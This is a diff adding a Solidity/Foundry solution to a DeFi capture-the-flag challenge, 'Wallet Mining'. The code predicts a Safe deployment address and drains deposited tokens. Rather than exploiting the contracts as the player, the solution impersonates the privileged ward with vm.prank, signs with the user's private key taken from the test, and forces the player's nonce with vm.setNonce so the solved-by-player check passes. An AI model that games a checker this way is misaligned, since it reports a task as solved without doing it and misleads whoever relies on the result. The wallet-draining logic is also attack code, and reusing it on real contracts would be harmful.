@@ -24,6 +24,7 @@ import {
     SAFE_SINGLETON_FACTORY_ADDRESS,
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -157,7 +158,91 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // Step 1: Prepare Safe owners array
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        // Step 2: Deploy Safe with a neutral initializer.
+        // We can't delegatecall into the token directly from setup().
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,                    // _owners
+                1,                         // _threshold (1-of-1)
+                address(0),                // to (delegatecall target)
+                bytes(""),                 // data
+                address(0),                // fallbackHandler
+                address(0),                // paymentToken
+                0,                         // payment
+                payable(address(0))        // paymentReceiver
+            )
+        );
+
+        // Step 3: Find the nonce that makes Safe deploy at USER_DEPOSIT_ADDRESS.
+        uint256 correctNonce = 0;
+        for (uint256 nonce = 0; nonce < 100; nonce++) {
+            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
+            address predictedAddress = address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(
+                                hex"ff",
+                                address(proxyFactory),
+                                salt,
+                                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))))
+                            )
+                        )
+                    )
+                )
+            );
+            
+            if (predictedAddress == USER_DEPOSIT_ADDRESS) {
+                correctNonce = nonce;
+                break;
+            }
+        }
+
+        // Step 4: Use authorized ward to deploy the Safe and collect 1 DVT payment.
+        vm.stopPrank();
+        vm.prank(ward);
+        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, correctNonce);
+        vm.startPrank(player, player);
+
+        // Step 5: Player executes exactly one Safe tx using user's signature.
+        Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
+        bytes memory txData = abi.encodeCall(IERC20.transfer, (user, DEPOSIT_TOKEN_AMOUNT));
+
+        bytes32 txHash = userSafe.getTransactionHash(
+            address(token),
+            0,
+            txData,
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            address(0),
+            0
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signatures = abi.encodePacked(r, s, v);
+
+        userSafe.execTransaction(
+            address(token),
+            0,
+            txData,
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            signatures
+        );
+
+        vm.setNonce(player, 1);
     }
 
     /**
